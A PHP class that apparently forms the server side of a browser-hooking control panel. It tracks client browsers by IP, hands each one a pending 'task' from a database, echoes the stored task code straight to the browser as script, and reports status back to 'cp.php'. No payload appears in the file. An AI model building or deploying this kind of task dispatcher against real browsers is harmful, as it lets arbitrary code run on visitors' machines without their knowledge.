<?php
class  Browser{

  var  $id;
  
  function  __construct($id){
   
    $this->id=$id;
 
   
  }
  /*
  *执行任务
  */
  public  function  do_task(){
  	
  $task=XBDB::fetch_first("task","*",array("bid"=> $this->id,"status"=>0)); //得到未执行的task
	if($task){
 	XBDB::update("task",array("status"=>1),array("id"=> $task['id']));        //改变状态为执行中
  echo $task['code'];
  echo "post('cp.php?a=1&id={$this->id}','status=1')";
  }
  	  	
  }
  /*
  *是否有浏览器 根据id
  */
  public  static   function  is_browser($id){
  	
     return  XBDB::fetch_first("browser","id",array("id"=> $id));   	
  }
  /*
  *判断唯一性  返回id
  */
	public  static function  is_exits(){

    
    $browser=XBDB::fetch_first("browser","id",array("ip"=>self::get_client_ip()));  //
    	
    return  $browser['id']  ? $browser['id'] :  false;   
  

	}
	/*
	*得到客户端ip
	*/
	public static function get_client_ip() {

    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $pos =  array_search('unknown',$arr);
        if(false !== $pos) unset($arr[$pos]);
        $ip   =  trim($arr[0]);
    }elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    // IP地址合法验证
    $ip = (false !== ip2long($ip)) ? $ip : '0.0.0.0';
    return $ip;

	}
	/*
	*得到客户端浏览器类型
	*/
	public static function get_client_browser(){

   $agent=strtolower($_SERVER['HTTP_USER_AGENT']);    
   if(strpos($agent,"firefox")){
    
    preg_match("#firefox/([0-9.]{1,10})#",$agent,$result);
    return "Firefox ".$result[1];
   	
  }elseif(strpos($agent,"msie")){
  	
  	preg_match("#msie[/]([0-9\.]{1,10})#",$agent,$result);
  	return  "internet explorer ".$result[1];
  	
  }elseif(strpos($agent,"opera")){
  
  	preg_match("#opera[/]([0-9\.]{1,10})#",$agent,$result);
  	return  "Opera ".$result[1];
  	
  }
 


	}
 }
	?>